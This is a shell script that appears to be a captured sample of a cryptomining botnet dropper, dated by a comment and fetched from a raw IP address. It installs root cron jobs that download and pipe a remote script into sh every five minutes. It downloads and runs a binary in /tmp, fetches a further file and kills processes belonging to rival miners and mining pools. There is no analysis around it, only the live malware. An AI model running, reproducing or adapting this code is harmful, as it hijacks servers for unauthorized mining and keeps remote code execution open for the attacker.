# data:2018-01-02T10:53:03.867354Z
#from http://218.248.40.228:8443/i.sh
export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin

echo "*/5 * * * * curl -fsSL http://218.248.40.228:8443/i.sh | sh" > /var/spool/cron/root
echo "*/5 * * * * wget -q -O- http://218.248.40.228:8443/i.sh | sh" >> /var/spool/cron/root
mkdir -p /var/spool/cron/crontabs
echo "*/5 * * * * curl -fsSL http://218.248.40.228:8443/i.sh | sh" > /var/spool/cron/crontabs/root
echo "*/5 * * * * wget -q -O- http://218.248.40.228:8443/i.sh | sh" >> /var/spool/cron/crontabs/root

if [ ! -f "/tmp/ddg.2021" ]; then
    curl -fsSL http://218.248.40.228:8443/2021/ddg.$(uname -m) -o /tmp/ddg.2021
fi

if [ ! -f "/tmp/ddg.2021" ]; then
    wget -q http://218.248.40.228:8443/2021/ddg.$(uname -m) -O /tmp/ddg.2021
fi

chmod +x /tmp/ddg.2021 && /tmp/ddg.2021


if [ ! -f "/tmp/imWBR1" ]; then
    curl -fsSL http://218.248.40.228:8443/imWBR1 -o /tmp/imWBR1 --compressed
fi

ps auxf | grep -v grep | grep Circle_MI | awk '{print $2}' | xargs kill
ps auxf | grep -v grep | grep get.bi-chi.com | awk '{print $2}' | xargs kill
ps auxf | grep -v grep | grep hashvault.pro | awk '{print $2}' | xargs kill
ps auxf | grep -v grep | grep nanopool.org | awk '{print $2}' | xargs kill
ps auxf | grep -v grep | grep minexmr.com | awk '{print $2}' | xargs kill
ps auxf | grep -v grep | grep /boot/efi/ | awk '{print $2}' | xargs kill
#ps auxf | grep -v grep | grep ddg.2006 | awk '{print $2}' | kill
#ps auxf | grep -v grep | grep ddg.2010 | awk '{print $2}' | kill

